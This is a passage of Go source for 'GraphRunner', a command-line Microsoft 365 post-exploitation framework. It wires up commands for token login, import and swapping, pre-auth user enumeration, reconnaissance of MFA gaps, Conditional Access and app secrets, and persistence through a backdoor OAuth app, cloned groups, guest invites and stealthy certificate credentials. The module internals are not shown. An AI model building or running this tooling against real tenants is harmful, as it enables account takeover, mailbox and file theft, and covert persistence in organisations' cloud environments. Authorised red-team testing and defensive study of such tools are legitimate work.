package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/graphrunner/internal/auth"
	"github.com/graphrunner/internal/config"
	"github.com/graphrunner/internal/graph"
	"github.com/graphrunner/internal/modules/cleanup"
	"github.com/graphrunner/internal/modules/escalate"
	"github.com/graphrunner/internal/modules/persist"
	"github.com/graphrunner/internal/modules/pillage"
	"github.com/graphrunner/internal/modules/recon"
	"github.com/graphrunner/internal/modules/spray"
	"github.com/graphrunner/internal/output"
)

var (
	version     = "0.2.0"
	app         *config.App
	passphrase  string
	sessionFlag string
	logFile     string
	outputDir   string
	outputCSV   string
	verbose     bool
	proxyURL    string
)

func main() {
	rootCmd := &cobra.Command{
		Use:     "graphrunner",
		Short:   "GraphRunner — M365 Post-Exploitation Framework (Go)",
		Version: version,
		PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
			output.VerboseEnabled = verbose

			if logFile != "" {
				if err := output.InitTee(logFile); err != nil {
					return err
				}
			}

			// Set auto-save dir: use --output-dir or default ./output
			if outputDir != "" {
				output.AutoSaveDir = outputDir
			} else {
				output.AutoSaveDir = "output"
			}

			var err error
			app, err = config.NewApp(passphrase)
			if err != nil {
				return err
			}
			app.SessionFlag = sessionFlag
			app.ProxyURL = proxyURL
			if proxyURL != "" {
				output.Info("Proxy enabled: %s", proxyURL)
			}
			return nil
		},
		PersistentPostRun: func(cmd *cobra.Command, args []string) {
			output.CloseTee()
		},
	}

	rootCmd.PersistentFlags().StringVar(&passphrase, "passphrase", "", "Passphrase for token store encryption (default: machine-derived)")
	rootCmd.PersistentFlags().StringVarP(&sessionFlag, "session", "s", "", "Use a specific session by name (overrides active session)")
	rootCmd.PersistentFlags().StringVar(&logFile, "log-file", "", "Tee all output to this file (plain text, no colors)")
	rootCmd.PersistentFlags().StringVar(&outputDir, "output-dir", "", "Directory for auto-saved results (default: ./output)")
	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "Show verbose output (pagination progress, detail)")
	rootCmd.PersistentFlags().StringVar(&proxyURL, "proxy", "", "HTTP proxy URL for Burp/ZAP (e.g. http://127.0.0.1:8080)")
	rootCmd.PersistentFlags().StringVar(&outputCSV, "output-csv", "", "Export tabular results to CSV file")

	rootCmd.AddCommand(
		authCmd(),
		reconCmd(),
		persistCmd(),
		pillageCmd(),
		cleanupCmd(),
		escalateCmd(),
		sprayCmd(),
		runCmd(),
	)

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

// ============================= AUTH =============================

func authCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "auth",
		Short: "Authentication and session management",
	}
	cmd.AddCommand(authLoginCmd(), authAppLoginCmd(), authCertLoginCmd(), authImportCmd(), authRefreshCmd(), authSessionsCmd(), authUseCmd(), authLogoutCmd(), authWatchCmd(), authWhoamiCmd(), authTokenCmd(), authTokenSwapCmd())
	return cmd
}

func authLoginCmd() *cobra.Command {
	var tenantID, clientID, username, password, sessionName string
	cmd := &cobra.Command{
		Use:   "login",
		Short: "Interactive login via device code (or ROPC with --username/--password)",
		RunE: func(cmd *cobra.Command, args []string) error {
			output.Banner()
			ctx := context.Background()

			if sessionName == "" {
				sessionName = fmt.Sprintf("session-%d", time.Now().Unix())
			}

			if username != "" && password != "" {
				output.Info("Authenticating via ROPC (username/password)...")
				sess, err := app.Authenticator.LoginROPC(ctx, sessionName, tenantID, clientID, username, password)
				if err != nil {
					return err
				}
				printSessionSummary(sess)
				return nil
			}

			sess, err := app.Authenticator.LoginDeviceCode(ctx, sessionName, tenantID, clientID)
			if err != nil {
				return err
			}
			printSessionSummary(sess)
			return nil
		},
	}
	cmd.Flags().StringVar(&tenantID, "tenant-id", "common", "Azure AD Tenant ID (default: common)")
	cmd.Flags().StringVar(&clientID, "client-id", "d3590ed6-52b3-4102-aeff-aad2292ab01c", "Client ID (default: Microsoft Office — broadest Graph scopes)")
	cmd.Flags().StringVar(&sessionName, "name", "", "Session name (default: auto-generated)")
	cmd.Flags().StringVar(&username, "username", "", "Username for ROPC flow")
	cmd.Flags().StringVar(&password, "password", "", "Password for ROPC flow")
	return cmd
}

func authAppLoginCmd() *cobra.Command {
	var tenantID, clientID, clientSecret, sessionName string
	cmd := &cobra.Command{
		Use:   "app-login",
		Short: "Authenticate using client credentials (app-only)",
		RunE: func(cmd *cobra.Command, args []string) error {
			output.Banner()
			ctx := context.Background()
			if sessionName == "" {
				sessionName = fmt.Sprintf("app-%d", time.Now().Unix())
			}
			output.Info("Authenticating via client credentials...")
			sess, err := app.Authenticator.LoginClientCredentials(ctx, sessionName, tenantID, clientID, clientSecret)
			if err != nil {
				return err
			}
			output.Success("Authenticated as session %q (expires: %s)", sess.Name, sess.ExpiresAt.Format(time.RFC3339))
			return nil
		},
	}
	cmd.Flags().StringVar(&tenantID, "tenant-id", "", "Azure AD Tenant ID")
	cmd.Flags().StringVar(&clientID, "client-id", "", "Client ID")
	cmd.Flags().StringVar(&clientSecret, "client-secret", "", "Client Secret")
	cmd.Flags().StringVar(&sessionName, "name", "", "Session name")
	cmd.MarkFlagRequired("tenant-id")
	cmd.MarkFlagRequired("client-id")
	cmd.MarkFlagRequired("client-secret")
	return cmd
}

func authCertLoginCmd() *cobra.Command {
	var tenantID, clientID, certPath, keyPath, pfxPassword, sessionName string
	cmd := &cobra.Command{
		Use:   "cert-login",
		Short: "Authenticate using a certificate (PFX/PEM) — client_assertion flow",
		RunE: func(cmd *cobra.Command, args []string) error {
			output.Banner()
			ctx := context.Background()
			if sessionName == "" {
				sessionName = fmt.Sprintf("cert-%d", time.Now().Unix())
			}
			output.Info("Authenticating via certificate...")
			cf := &auth.CertLoginFlow{
				TenantID: tenantID,
				ClientID: clientID,
				CertPath: certPath,
				KeyPath:  keyPath,
				Password: pfxPassword,
			}
			result, err := cf.Authenticate(ctx)
			if err != nil {
				return err
			}
			sess, err := app.Authenticator.ImportToken(sessionName, tenantID, clientID, result.AccessToken, "", int(time.Until(result.ExpiresAt).Seconds()))
			if err != nil {
				return err
			}
			// Override auth flow label
			if err := app.Store.SetActive(sessionName); err != nil {
				return err
			}
			output.Success("Authenticated via certificate as session %q (expires: %s)", sess.Name, sess.ExpiresAt.Format(time.RFC3339))
			return nil
		},
	}
	cmd.Flags().StringVar(&tenantID, "tenant-id", "", "Azure AD Tenant ID")
	cmd.Flags().StringVar(&clientID, "client-id", "", "Client (Application) ID")
	cmd.Flags().StringVar(&certPath, "cert", "", "Path to PFX/P12 or PEM certificate file")
	cmd.Flags().StringVar(&keyPath, "key-file", "", "Path to private key PEM (if cert is PEM; not needed for PFX)")
	cmd.Flags().StringVar(&pfxPassword, "pfx-password", "", "PFX file password")
	cmd.Flags().StringVar(&sessionName, "name", "", "Session name")
	cmd.MarkFlagRequired("tenant-id")
	cmd.MarkFlagRequired("client-id")
	cmd.MarkFlagRequired("cert")
	return cmd
}

func authImportCmd() *cobra.Command {
	var tenantID, clientID, accessToken, refreshToken, sessionName string
	var expiresIn int
	cmd := &cobra.Command{
		Use:   "import-token",
		Short: "Import tokens from another tool (ROADTools, AADInternals, etc.)",
		RunE: func(cmd *cobra.Command, args []string) error {
			if sessionName == "" {
				sessionName = fmt.Sprintf("imported-%d", time.Now().Unix())
			}
			sess, err := app.Authenticator.ImportToken(sessionName, tenantID, clientID, accessToken, refreshToken, expiresIn)
			if err != nil {
				return err
			}
			output.Success("Imported session %q (expires: %s)", sess.Name, sess.ExpiresAt.Format(time.RFC3339))
			return nil
		},
	}
	cmd.Flags().StringVar(&tenantID, "tenant-id", "", "Tenant ID (for refresh)")
	cmd.Flags().StringVar(&clientID, "client-id", "", "Client ID (for refresh)")
	cmd.Flags().StringVar(&accessToken, "access-token", "", "Access token")
	cmd.Flags().StringVar(&refreshToken, "refresh-token", "", "Refresh token (optional)")
	cmd.Flags().StringVar(&sessionName, "name", "", "Session name")
	cmd.Flags().IntVar(&expiresIn, "expires-in", 3600, "Token TTL in seconds")
	cmd.MarkFlagRequired("access-token")
	return cmd
}

func authRefreshCmd() *cobra.Command {
	var sessionName string
	cmd := &cobra.Command{
		Use:   "refresh",
		Short: "Force refresh the token for a session",
		RunE: func(cmd *cobra.Command, args []string) error {
			ctx := context.Background()
			if sessionName == "" {
				sess, err := app.Store.GetActive()
				if err != nil {
					return err
				}
				sessionName = sess.Name
			}
			output.Info("Refreshing session %q...", sessionName)
			sess, err := app.Authenticator.RefreshSession(ctx, sessionName)
			if err != nil {
				return err
			}
			output.Success("Refreshed! New expiry: %s", sess.ExpiresAt.Format(time.RFC3339))
			return nil
		},
	}
	cmd.Flags().StringVar(&sessionName, "name", "", "Session to refresh (default: active)")
	return cmd
}

func authSessionsCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "sessions",
		Short: "List all stored sessions",
		RunE: func(cmd *cobra.Command, args []string) error {
			sessions := app.Store.List()
			if len(sessions) == 0 {
				output.Warn("No sessions stored. Use 'graphrunner auth login' to authenticate.")
				return nil
			}
			output.Header("Stored Sessions")
			fmt.Printf("  %-3s %-22s %-18s %-24s %-10s %-20s %s\n",
				"", "NAME", "AUTH FLOW", "TENANT", "STATUS", "EXPIRES", "TOKEN")
			fmt.Printf("  %-3s %-22s %-18s %-24s %-10s %-20s %s\n",
				"", "----", "---------", "------", "------", "-------", "-----")
			for _, s := range sessions {
				marker := "  "
				if s.Active {
					marker = "> "
				}
				status := output.StyleSuccess.Render("valid")
				if s.IsExpired() {
					status = output.StyleError.Render("EXPIRED")
				}
				fmt.Printf("%s %-22s %-18s %-24s %-10s %-20s %s\n",
					marker, s.Name, s.AuthFlow, s.TenantID, status,
					s.ExpiresAt.Format("2006-01-02 15:04"), s.AccessToken)
			}
			fmt.Println()
			output.Dim("Use 'graphrunner auth use <name>' to switch, or '-s <name>' on any command")
			return nil
		},
	}
}

func authUseCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "use [session-name]",
		Short: "Switch the active session",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := app.Store.SetActive(args[0]); err != nil {
				return err
			}
			output.Success("Active session: %s", args[0])
			return nil
		},
	}
}

func authLogoutCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "logout [session-name]",
		Short: "Remove a stored session",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := app.Store.Remove(args[0]); err != nil {
				return err
			}
			output.Success("Removed session: %s", args[0])
			return nil
		},
	}
}

func authTokenCmd() *cobra.Command {
	var sessionName string
	var raw bool
	cmd := &cobra.Command{
		Use:   "token",
		Short: "Print the access token of the active session (for use with curl, Burp, etc.)",
		RunE: func(cmd *cobra.Command, args []string) error {
			var sess *auth.Session
			var err error
			if sessionName != "" {
				sess, err = app.Store.Get(sessionName)
			} else {
				sess, err = app.Store.GetActive()
			}
			if err != nil {
				return err
			}
			if sess.IsExpired() {
				output.Warn("Token is expired — run 'graphrunner auth refresh' first")
			}
			if raw {
				// Clean output for piping: curl -H "Authorization: Bearer $(graphrunner auth token -r)"
				fmt.Print(sess.AccessToken)
			} else {
				fmt.Printf("Bearer %s\n", sess.AccessToken)
			}
			return nil
		},
	}
	cmd.Flags().StringVar(&sessionName, "name", "", "Session name (default: active)")
	cmd.Flags().BoolVarP(&raw, "raw", "r", false, "Print token only (no 'Bearer' prefix), for piping")
	return cmd
}

func authTokenSwapCmd() *cobra.Command {
	var resource, sessionName, newSessionName string
	var listResources bool
	cmd := &cobra.Command{
		Use:   "token-swap",
		Short: "Swap a refresh token for a different Azure resource (TokenTactics-style)",
		RunE: func(cmd *cobra.Command, args []string) error {
			if listResources {
				output.Header("Available Resources")
				for name, scope := range auth.ResourceScopes {
					fmt.Printf("  %-15s %s\n", name, scope)
				}
				return nil
			}
			if resource == "" {
				return fmt.Errorf("provide --resource (e.g. azure, outlook, vault) or use --list")
			}

			var sess *auth.Session
			var err error
			if sessionName != "" {
				sess, err = app.Store.Get(sessionName)
			} else {
				sess, err = app.Store.GetActive()
			}
			if err != nil {
				return err
			}
			if sess.RefreshToken == "" {
				return fmt.Errorf("session %q has no refresh token — token swap requires a refresh token", sess.Name)
			}

			swap := &auth.TokenSwapFlow{
				TenantID: sess.TenantID,
				ClientID: sess.ClientID,
			}

			output.Info("Swapping token for resource: %s", resource)
			result, err := swap.Swap(context.Background(), sess.RefreshToken, resource)
			if err != nil {
				return err
			}

			// Store as new session
			if newSessionName == "" {
				newSessionName = fmt.Sprintf("%s-%s", sess.Name, resource)
			}
			newSess, err := app.Authenticator.ImportToken(newSessionName, sess.TenantID, sess.ClientID, result.AccessToken, result.RefreshToken, int(time.Until(result.ExpiresAt).Seconds()))
			if err != nil {
				return err
			}
			output.Success("Token swapped! New session: %s (resource: %s)", newSess.Name, resource)
			output.Info("  Expires: %s", newSess.ExpiresAt.Format("2006-01-02 15:04:05"))
			if len(result.Scopes) > 0 {
				output.Info("  Scopes: %s", strings.Join(result.Scopes, " "))
			}
			return nil
		},
	}
	cmd.Flags().StringVar(&resource, "resource", "", "Target resource: graph, azure, outlook, vault, storage, substrate, teams, office, core-mgmt")
	cmd.Flags().StringVar(&sessionName, "from", "", "Source session name (default: active)")
	cmd.Flags().StringVar(&newSessionName, "name", "", "New session name (default: <source>-<resource>)")
	cmd.Flags().BoolVar(&listResources, "list", false, "List available resource targets")
	return cmd
}

// printAndSave prints result as JSON and auto-saves to disk (+ optional CSV).
func printAndSave(name string, result interface{}) {
	fmt.Println(output.PrettyJSON(result))
	if saved := output.AutoSave(name, result); saved != "" {
		output.Success("Saved → %s", saved)
	}
	if outputCSV != "" {
		if err := output.WriteCSV(outputCSV, result); err != nil {
			output.Verbose("CSV export skipped: %v", err)
		} else {
			output.Success("CSV → %s", outputCSV)
		}
	}
}

func printSessionSummary(sess *auth.Session) {
	fmt.Println()
	if sess.UserPrincipalName != "" {
		output.Success("Authenticated as %s", sess.UserPrincipalName)
		if sess.DisplayName != "" {
			fmt.Printf("  Name    : %s\n", sess.DisplayName)
		}
	} else {
		output.Success("Authenticated (app-only)")
	}
	fmt.Printf("  Tenant  : %s\n", sess.TenantID)
	fmt.Printf("  Session : %s\n", sess.Name)
	fmt.Printf("  Expires : %s\n", sess.ExpiresAt.Format("2006-01-02 15:04:05"))
	if len(sess.Scopes) > 0 {
		fmt.Printf("  Scopes  : %s\n", strings.Join(sess.Scopes, " "))
	}
	fmt.Println()
	output.Dim("Run any command — the active session is used automatically.")
}

func authWhoamiCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "whoami",
		Short: "Show the identity of the current active session",
		RunE: func(cmd *cobra.Command, args []string) error {
			sess, err := app.Store.GetActive()
			if err != nil {
				return err
			}

			// Always parse JWT live — works for old sessions stored before claim extraction
			upn := sess.UserPrincipalName
			name := sess.DisplayName
			oid := sess.ObjectID
			tenant := sess.TenantID
			if claims, err := auth.ParseJWT(sess.AccessToken); err == nil {
				if claims.UPN != "" {
					upn = claims.UPN
				}
				if claims.Name != "" {
					name = claims.Name
				}
				if claims.ObjectID != "" {
					oid = claims.ObjectID
				}
				if claims.TenantID != "" {
					tenant = claims.TenantID
				}
			}

			fmt.Println()
			output.Header("Current Session")

			if upn != "" {
				fmt.Printf("  User    : %s\n", upn)
			}
			if name != "" {
				fmt.Printf("  Name    : %s\n", name)
			}
			if oid != "" {
				fmt.Printf("  OID     : %s\n", oid)
			}
			fmt.Printf("  Tenant  : %s\n", tenant)
			fmt.Printf("  Session : %s\n", sess.Name)
			fmt.Printf("  Flow    : %s\n", sess.AuthFlow)

			status := output.StyleSuccess.Render("valid")
			remaining := time.Until(sess.ExpiresAt).Round(time.Minute)
			if sess.IsExpired() {
				status = output.StyleError.Render("EXPIRED")
				remaining = 0
			}
			fmt.Printf("  Status  : %s", status)
			if remaining > 0 {
				fmt.Printf(" (expires in %s)", remaining)
			}
			fmt.Println()
			fmt.Printf("  Expires : %s\n", sess.ExpiresAt.Format("2006-01-02 15:04:05"))
			if sess.RefreshToken != "" {
				fmt.Printf("  Refresh : available\n")
			}
			fmt.Println()
			return nil
		},
	}
}

// ============================= RECON =============================

func reconCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "recon",
		Short: "Reconnaissance and enumeration modules",
	}

	var outputJSON, outputHTML string
	cmd.PersistentFlags().StringVar(&outputJSON, "output-json", "", "Write results to JSON file")
	cmd.PersistentFlags().StringVar(&outputHTML, "output-html", "", "Write results to HTML file")

	cmd.AddCommand(
		reconSubCmd("tenant", "Enumerate tenant configuration and org info", func(c *graph.Client) (interface{}, error) {
			return recon.Tenant(context.Background(), c)
		}),
		reconSubCmd("users", "Enumerate all directory users", func(c *graph.Client) (interface{}, error) {
			return recon.Users(context.Background(), c)
		}),
		reconSubCmd("groups", "Enumerate security, dynamic, and updatable groups", func(c *graph.Client) (interface{}, error) {
			return recon.Groups(context.Background(), c)
		}),
		reconSubCmd("apps", "Enumerate app registrations, service principals, and OAuth grants", func(c *graph.Client) (interface{}, error) {
			return recon.Apps(context.Background(), c)
		}),
		reconSubCmd("caps", "Dump Conditional Access policies", func(c *graph.Client) (interface{}, error) {
			return recon.ConditionalAccess(context.Background(), c)
		}),
		reconSubCmd("roles", "Enumerate privileged role assignments", func(c *graph.Client) (interface{}, error) {
			return recon.Roles(context.Background(), c)
		}),
		reconSubCmd("sharepoint", "Discover SharePoint site URLs (quick)", func(c *graph.Client) (interface{}, error) {
			return recon.SharePoint(context.Background(), c)
		}),
		reconSubCmd("sharepoint-deep", "Deep SharePoint enumeration: public sites, permissions, drives, lists", func(c *graph.Client) (interface{}, error) {
			return recon.SharePointDeep(context.Background(), c)
		}),
		reconSubCmd("open-inboxes", "Scan for mailboxes accessible to current token", func(c *graph.Client) (interface{}, error) {
			return recon.OpenInboxes(context.Background(), c)
		}),
		reconSubCmd("mfa-status", "Check MFA registration status for all users (finds accounts without MFA)", func(c *graph.Client) (interface{}, error) {
			return recon.MFAStatus(context.Background(), c)
		}),
		reconSubCmd("devices", "Enumerate all registered devices (compliance, ownership, platform)", func(c *graph.Client) (interface{}, error) {
			return recon.Devices(context.Background(), c)
		}),
		reconSubCmd("named-locations", "Enumerate Conditional Access named locations (trusted IPs/countries)", func(c *graph.Client) (interface{}, error) {
			return recon.NamedLocations(context.Background(), c)
		}),
		reconSubCmd("cross-tenant", "Enumerate cross-tenant access policies and B2B configuration", func(c *graph.Client) (interface{}, error) {
			return recon.CrossTenantAccess(context.Background(), c)
		}),
		reconSubCmd("sp-secrets", "Enumerate app/SP credentials — find expired/weak secrets and certificates", func(c *graph.Client) (interface{}, error) {
			return recon.ServicePrincipalSecrets(context.Background(), c)
		}),
		reconSubCmd("delegated-perms", "List all oauth2PermissionGrants — who consented what (flags high-risk)", func(c *graph.Client) (interface{}, error) {
			return recon.DelegatedPermissions(context.Background(), c)
		}),
		reconSubCmd("app-proxy", "Discover Azure AD Application Proxy apps (internal apps exposed externally)", func(c *graph.Client) (interface{}, error) {
			return recon.AppProxy(context.Background(), c)
		}),
		reconSubCmd("sp-audit", "Full SharePoint audit: all sites visible to you, public/external exposure, file counts, risks", func(c *graph.Client) (interface{}, error) {
			return recon.SPAudit(context.Background(), c)
		}),
		reconAllCmd(),
		reconUserEnumCmd(),
		reconDomainInfoCmd(),
		reconAuditLogsCmd(),
		reconIntuneDevicesCmd(),
		reconUserProfileCmd(),
	)
	return cmd
}

func reconUserEnumCmd() *cobra.Command {
	var usernameList, usernameFile string
	var delaySec int
	cmd := &cobra.Command{
		Use:   "user-enum",
		Short: "Enumerate valid users via GetCredentialType (NO AUTH REQUIRED)",
		RunE: func(cmd *cobra.Command, args []string) error {
			output.Header("Recon: User Enumeration (pre-auth)")

			var usernames []string
			if usernameFile != "" {
				lines, err := readLines(usernameFile)
				if err != nil {
					return fmt.Errorf("read username file: %w", err)
				}
				usernames = lines
			} else if usernameList != "" {
				for _, u := range strings.Split(usernameList, ",") {
					u = strings.TrimSpace(u)
					if u != "" {
						usernames = append(usernames, u)
					}
				}
			}
			if len(usernames) == 0 {
				return fmt.Errorf("provide --users (comma-separated) or --user-file")
			}

			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()
			result, err := recon.UserEnum(ctx, usernames, delaySec)
			if err != nil {
				return err
			}
			printAndSave("recon-user-enum", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&usernameList, "users", "", "Comma-separated usernames/UPNs to check")
	cmd.Flags().StringVar(&usernameFile, "user-file", "", "File with one username per line")
	cmd.Flags().IntVar(&delaySec, "delay", 0, "Delay between requests in seconds")
	return cmd
}

func reconDomainInfoCmd() *cobra.Command {
	var domain string
	cmd := &cobra.Command{
		Use:   "domain-info",
		Short: "List all tenant domains (authenticated) or deep-scan a specific domain (-d, no auth needed)",
		Example: "  graphrunner recon domain-info                  # list all tenant domains (needs auth)\n  graphrunner recon domain-info -d promart.pe     # deep recon on specific domain (no auth)",
		RunE: func(cmd *cobra.Command, args []string) error {
			// Support positional arg as domain too
			if domain == "" && len(args) > 0 {
				domain = args[0]
			}

			ctx := context.Background()

			// If -d specified: unauthenticated deep recon on that domain
			if domain != "" {
				output.Header("Recon: Domain Info (pre-auth)")
				result, err := recon.DomainInfo(ctx, domain)
				if err != nil {
					return err
				}
				printAndSave("recon-domain-info", result)
				return nil
			}

			// No -d: list all tenant domains (authenticated)
			output.Header("Recon: Tenant Domains")
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			result, err := recon.DomainList(ctx, client)
			if err != nil {
				return err
			}
			printAndSave("recon-domains", result)
			return nil
		},
	}
	cmd.Flags().StringVarP(&domain, "domain", "d", "", "Deep-scan a specific domain (unauthenticated, no session needed)")
	return cmd
}

func reconAuditLogsCmd() *cobra.Command {
	var top int
	var filter string
	cmd := &cobra.Command{
		Use:   "audit-logs",
		Short: "Retrieve directory audit logs and sign-in logs (requires AuditLog.Read.All)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Recon: Audit Logs")
			result, err := recon.AuditLogs(context.Background(), client, top, filter)
			if err != nil {
				return err
			}
			printAndSave("recon-audit-logs", result)
			return nil
		},
	}
	cmd.Flags().IntVar(&top, "top", 100, "Max entries per log type")
	cmd.Flags().StringVar(&filter, "filter", "", "OData filter for audit logs (e.g. \"activityDisplayName eq 'Add member to role'\")")
	return cmd
}

func reconIntuneDevicesCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "intune-devices",
		Short: "Enumerate Intune managed devices (requires DeviceManagementManagedDevices.Read.All)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Recon: Intune Devices")
			result, err := recon.IntuneDevices(context.Background(), client)
			if err != nil {
				return err
			}
			printAndSave("recon-intune-devices", result)
			return nil
		},
	}
}

func reconUserProfileCmd() *cobra.Command {
	var allUsers bool
	var targetUser string
	cmd := &cobra.Command{
		Use:   "user-profile",
		Short: "Get-ADUser style profile: attributes, roles, groups, manager, reports, auth methods",
		Long: `Show full user profile like Get-ADUser -Properties *.

Without flags: shows current user (whoami).
With --user: shows a specific user by UPN or Object ID.
With --all: shows all users with directory role assignments.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}

			ctx := context.Background()
			var result *recon.UserProfileResult

			if targetUser != "" {
				output.Header("Recon: User Profile — " + targetUser)
				result, err = recon.UserProfileByUPN(ctx, client, targetUser)
			} else if allUsers {
				output.Header("Recon: All Privileged Users")
				result, err = recon.UserProfileAll(ctx, client)
			} else {
				output.Header("Recon: whoami (Full Profile)")
				result, err = recon.UserProfileMe(ctx, client)
			}
			if err != nil {
				return err
			}
			printAndSave("recon-user-profile", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&targetUser, "user", "", "Target user by UPN or Object ID (e.g. user@domain.com)")
	cmd.Flags().BoolVar(&allUsers, "all", false, "Show all users with role assignments + their groups")
	return cmd
}

func reconSubCmd(use, short string, fn func(*graph.Client) (interface{}, error)) *cobra.Command {
	return &cobra.Command{
		Use:   use,
		Short: short,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Recon: " + use)
			result, err := fn(client)
			if err != nil {
				output.Error("Module error: %v", err)
				return err
			}
			printAndSave("recon-"+use, result)

			// Optional explicit paths
			// Optional explicit paths
			if path, _ := cmd.Flags().GetString("output-json"); path != "" {
				if err := output.WriteJSON(path, result); err != nil {
					output.Error("Failed to write JSON: %v", err)
				} else {
					output.Success("JSON saved to %s", path)
				}
			}
			if path, _ := cmd.Flags().GetString("output-html"); path != "" {
				sections := []output.HTMLSection{{Title: "Recon: " + use, Content: output.PrettyJSON(result)}}
				if err := output.WriteHTML(path, sections); err != nil {
					output.Error("Failed to write HTML: %v", err)
				} else {
					output.Success("HTML saved to %s", path)
				}
			}
			return nil
		},
	}
}

func reconAllCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "all",
		Short: "Run all recon modules",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Banner()
			output.Header("Full Reconnaissance")
			results := recon.All(context.Background(), client)
			fmt.Println(output.PrettyJSON(results))
			if path, _ := cmd.Flags().GetString("output-json"); path != "" {
				if err := output.WriteJSON(path, results); err != nil {
					output.Error("Failed to write JSON: %v", err)
				} else {
					output.Success("JSON saved to %s", path)
				}
			}
			if path, _ := cmd.Flags().GetString("output-html"); path != "" {
				sections := []output.HTMLSection{{Title: "Full Reconnaissance", Content: output.PrettyJSON(results)}}
				if err := output.WriteHTML(path, sections); err != nil {
					output.Error("Failed to write HTML: %v", err)
				} else {
					output.Success("HTML saved to %s", path)
				}
			}
			return nil
		},
	}
}

// ============================= PERSIST =============================

func persistCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "persist",
		Short: "Persistence modules (write operations)",
	}
	cmd.AddCommand(persistInjectAppCmd(), persistCloneGroupCmd(), persistInviteGuestCmd(), persistAddMemberCmd(), persistAddKeyCred(), persistMailRuleCmd(), persistListMailRulesCmd())
	return cmd
}

func persistInjectAppCmd() *cobra.Command {
	var appName, preset string
	cmd := &cobra.Command{
		Use:   "inject-app",
		Short: "Create a backdoor OAuth application with delegated permissions",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Persist: Inject OAuth App")
			result, err := persist.InjectOAuthApp(context.Background(), client, appName, preset)
			if err != nil {
				return err
			}
			printAndSave("persist-inject-app", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&appName, "app-name", "GraphRunner-Backdoor", "Display name for the app")
	cmd.Flags().StringVar(&preset, "preset", "backdoor", "Permission preset: backdoor, mail-reader, files-reader, custom")
	return cmd
}

func persistCloneGroupCmd() *cobra.Command {
	var sourceGroupID string
	var addSelf bool
	cmd := &cobra.Command{
		Use:   "clone-group",
		Short: "Clone a security group (same display name)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Persist: Clone Security Group")
			result, err := persist.CloneGroup(context.Background(), client, sourceGroupID, addSelf)
			if err != nil {
				return err
			}
			printAndSave("persist-clone-group", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&sourceGroupID, "group-id", "", "Source group ID to clone")
	cmd.Flags().BoolVar(&addSelf, "add-self", true, "Add current user as member of cloned group")
	cmd.MarkFlagRequired("group-id")
	return cmd
}

func persistInviteGuestCmd() *cobra.Command {
	var email, displayName, redirectURL string
	cmd := &cobra.Command{
		Use:   "invite-guest",
		Short: "Invite an external guest user to the tenant",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Persist: Invite Guest User")
			result, err := persist.InviteGuest(context.Background(), client, email, displayName, redirectURL)
			if err != nil {
				return err
			}
			printAndSave("persist-invite-guest", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&email, "email", "", "Guest email address")
	cmd.Flags().StringVar(&displayName, "display-name", "", "Display name")
	cmd.Flags().StringVar(&redirectURL, "redirect-url", "https://myapps.microsoft.com", "Redirect URL")
	cmd.MarkFlagRequired("email")
	return cmd
}

func persistAddMemberCmd() *cobra.Command {
	var groupID, userID string
	cmd := &cobra.Command{
		Use:   "add-member",
		Short: "Add a user/SP to a security group",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Persist: Add Group Member")
			err = persist.AddGroupMember(context.Background(), client, groupID, userID)
			if err != nil {
				return err
			}
			output.Success("Added %s to group %s", userID, groupID)
			return nil
		},
	}
	cmd.Flags().StringVar(&groupID, "group-id", "", "Target group ID")
	cmd.Flags().StringVar(&userID, "user-id", "", "User or SP object ID to add")
	cmd.MarkFlagRequired("group-id")
	cmd.MarkFlagRequired("user-id")
	return cmd
}

func persistAddKeyCred() *cobra.Command {
	var appObjectID, displayName string
	var validDays int
	cmd := &cobra.Command{
		Use:   "add-key-cred",
		Short: "Add a certificate credential to an app (shadow cred, stealthier than password)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Persist: Add Key Credential (Certificate)")
			result, err := persist.AddKeyCredential(context.Background(), client, appObjectID, displayName, validDays)
			if err != nil {
				return err
			}
			printAndSave("persist-add-key-cred", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&appObjectID, "app-id", "", "Application object ID")
	cmd.Flags().StringVar(&displayName, "name", "GraphRunner", "Display name for the credential")
	cmd.Flags().IntVar(&validDays, "valid-days", 365, "Certificate validity in days")
